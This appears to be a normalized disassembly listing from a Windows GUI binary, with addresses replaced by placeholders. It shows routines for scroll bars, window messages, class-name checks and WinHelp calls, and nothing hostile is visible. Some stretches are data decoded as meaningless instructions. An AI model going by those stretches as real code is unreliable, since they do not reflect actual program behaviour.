pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4413ec
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44a7b8
sub_437068
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44492c
mov eax [ ebp - 0x4 ]
call sub_4449fc
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
push ebp
call sub_436fac
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43dad0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403468
sub_4370f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_436b90
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4414b0
mov eax ebx
mov si 0xffc8
call sub_403468
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_43714b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5aa5173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_4446f8
push eax
call SendMessageA
pop ebx
retn
sub_437180
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4371f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43dec4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_455a9c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443b7c
mov eax ebx
mov si 0xffb8
call sub_403468
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4371fc
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_437204
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403468
jmp r-xdata
pop esi
retn
sub_437234
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440424
mov edx 0x79
mov eax esi
call sub_43d680
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_43d6a4
mov dl 0x1
mov eax esi
call sub_44492c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4372a7
mov [ esi + 0x222 ] 0x7ca10001
loop r-xdata
mov [ 0x64b90000 ] al
jae r-xdata
add [ eax + 0x74000c78 ] al
adc [ ecx + rw-data ] esp
cmp [ eax ] 0x2
jne r-xdata
add [ eax ] al
add [ ebx - 0x173c7429 ] cl
cmpsb [ esi ] [ edi ]
mov eax [ 0xffffffffc0330000 ]
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax esi
test bl bl
je r-xdata
mov [ esi + 0x184 ] 0x0
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
test al al
je r-xdata
mov eax ebx
call sub_43742c
mov eax ebx
mov si 0xffc8
call sub_403468
test al al
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
sub_43737c
call sub_43d864
mov eax ebx
call sub_4416b0
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_43d884
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call SetScrollInfo
mov eax ebx
call sub_43742c
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_43742c
push ebx
mov ebx eax
mov eax ebx
call sub_43e508
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_43744c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_441c98
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_437488
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4375bf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_4449fc
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4375c6
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_4449fc
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_403468
mov eax ebx
call sub_43742c
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call SetScrollPos
jmp r-xdata
sub_4375e4
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_4449fc
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call SetScrollInfo
sub_4376ac
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_4376d1 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4446f8
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_43742c
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_403468
mov edx [ esp ]
mov eax ebx
call sub_4375d0
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_4377d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4446f8
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_437804
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_437829
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437830
retn
sub_437930
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44a608
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43796c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_437991
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437998
retn
sub_437a3c
sbb eax 0x2700437a
cld
mov al 0xe
pop edi
add [ ecx ] dh
jpe r-xdata
jpe r-xdata
daa
cmp bh [ edx + edi * 2 ]
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add ch dl
jns r-xdata
std
cmp bh [ edx + edi * 2 ]
jns r-xdata
add al al
dec edi
add ch bl
jns r-xdata
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ 0xd00437a ] al
jpe r-xdata
int 0x79
inc ebx
cmp bh [ edx + edi * 2 ]
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] ah
inc ebx
add [ eax + 0x437a ] al
add [ eax ] al
add [ ebx + edi * 2 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
jpo r-xdata
lodsd [ esi ]
add ch ah
jns r-xdata
jns r-xdata
add al al
dec edi
add [ 0xffffffffb500437a ] dl
jns r-xdata
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437c05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fbc
test edi edi
jne r-xdata
add [ eax + eax ] ah
add [ eax ] al
xchg esp eax
adc [ eax ] eax
mov ah 0x34
inc eax
add [ eax - 0x4bffbfaa ] ch
push esi
inc eax
add al cl
xor al 0x40
add [ esp + esi + 0x56c40040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
les eax [ ebp + 0xe0043 ]
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
pop eax
inc ebp
inc edx
add [ eax + eax ] bl
add [ eax ] al
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
add ch ch
jns r-xdata
inc ebx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
add [ ebp - 0x3affbc87 ] bh
jns r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404054
cmp [ ebx + 0x1c ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] al
add ch dh
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ eax ] al
xchg ebx eax
add ch cl
jns r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
add [ eax ] al
xchg bx ax
jns r-xdata
add ch bh
cld
add [ ebp + 0x3004379 ] ch
add [ eax ] al
add [ esi - 0x6d ] ah
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437c0c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40433c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_437b50
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_437c05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fbc
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404054
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437c0c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40433c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_437c20
push ebx
mov ebx eax
mov eax ebx
call sub_437f50
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405628
sub_437c5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437cc3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_437b50
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437cca
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_437cd4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437d5c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_437c48
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40433c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437d63
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
sub_437d6f
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_437df7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_438494
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437dfe
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_437b50
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437e04
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_437efc
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_437b50
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b94
mov eax ebx
call sub_438494
test al al
je r-xdata
mov ecx sub_4379a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437f03
lea eax [ ebp - 0x1c ]
call sub_403fbc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_437b50
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_4383ec
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404010
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40447c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_437f6c
push ebx
mov ebx eax
mov eax ebx
call sub_437f50
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405628
pop ebx
retn
mov eax rw-data
call sub_405628
sub_437f9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437ff4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437ffb
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_437b50
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_438004
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4380fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408b54
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_437b50
mov eax ebx
call sub_438494
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438101
lea eax [ ebp - 0x110 ]
call sub_403fbc
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40422c
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_4383ec
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40422c
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_438118
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43817a
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438181
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_437b50
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43818c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43820c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_437b50
mov eax ebx
call sub_438494
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438213
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4383ec
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_40447c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43821c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_438307
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_438494
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43830e
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fe0
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407e9c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_4383ec
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407e9c
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_404010
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_437b50
mov eax [ ebp - 0x14 ]
call sub_40447c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_43831c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4085cc
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_438377
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4085a8
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_4383ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40446c
xor eax eax
push ebp
push sub_438462
